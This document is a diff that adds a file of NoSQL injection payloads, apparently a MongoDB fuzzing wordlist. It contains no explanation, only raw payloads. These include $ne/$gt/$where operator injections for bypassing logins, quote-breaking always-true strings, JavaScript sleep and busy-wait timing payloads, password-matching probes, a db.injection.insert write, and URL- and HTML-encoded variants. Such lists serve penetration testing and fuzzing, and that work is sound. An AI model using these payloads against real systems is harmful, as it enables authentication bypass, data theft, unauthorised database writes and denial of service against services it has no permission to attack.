@@ -1,0 +1,73 @@
+'"\/$[].>
+%27%22%5C%2F%24%5B%5D.%3E
+%27%22%5c%2f%24%5b%5d%2e%3e
+'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
+%27%5c%22%60%7b%5c%72%3b%24%46%6f%6f%7d%5c%6e%24%46%6f%6f%20%5c%5c%78%59%5a%5c%75%30%30%30%30
+%27%22%60%7b%0a%3b%24%46%6f%6f%7d%0a%24%46%6f%6f%20%5c%78%59%5a
+&#x27;&#x22;&#x60;&#x7b;&#x0a;&#x3b;&#x24;&#x46;&#x6f;&#x6f;&#x7d;&#x0a;&#x24;&#x46;&#x6f;&#x6f;&#x20;&#x5c;&#x78;&#x59;&#x5a;
+%27%22%60%7B+%3B%24Foo%7D+%24Foo+%5CxYZ
+" OR "" = "
+" OR 1 = 1 -- -
+""
+";return(true);var xyz='a
+$gt
+$ne
+$nin
+$where: '1 == 1'
+$where=sleep(100)
+'
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+' OR '' = '
+' OR '1
+' OR 1 -- -
+' || 1==1%00
+' || 1==1//
+' } ], $comment:'successful MongoDB injection'
+'"\/$[].>
+'"\;{}
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+'%2b(function()%7bif(typeof%20dipyx%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bdipyx%3d1%3b%7d%7d())%2b'
+'%2bfunction(){var waitTill = new Date(new Date().getTime() %2b 5000);while(waitTill > new Date()){};}(this)%2b'
+''
+'+function(){var waitTill = new Date(new Date().getTime() + 5000);while(waitTill > new Date()){};}(this)+'
+', $or: [ {}, { 'a':'a
+', $where: '1 == 1
+', $where: '1 == 1'
+'/{}:
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+';return 'a'=='a' && ''=='
+';sleep(5000);
+';sleep(5000);'
+';sleep(5000);+'
+'||'1'=='1';//
+, $where: '1 == 1'
+--
+-- -
+//
+0;return true
+1, $where: '1 == 1'
+;
+;%00
+;sleep(100);
+OR 1=1
+[$ne]=1
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+true, $where: '1 == 1'
+{ $ne: 1 }
+{"$func": "var_dump"}
+{"$gt": ""}
+{"$gt":""}
+{"$gt":-1}
+{"$ne":""}
+{"$ne":-1}
+{"$nin":1}
+{"$nin":[1]}
+{"$where":  "sleep(100)"}
+{"$where":  "sleep(1000)"}
+{$gt: ''}
+|| '1'=='1
+|| 1==1
+||'a'\\'a
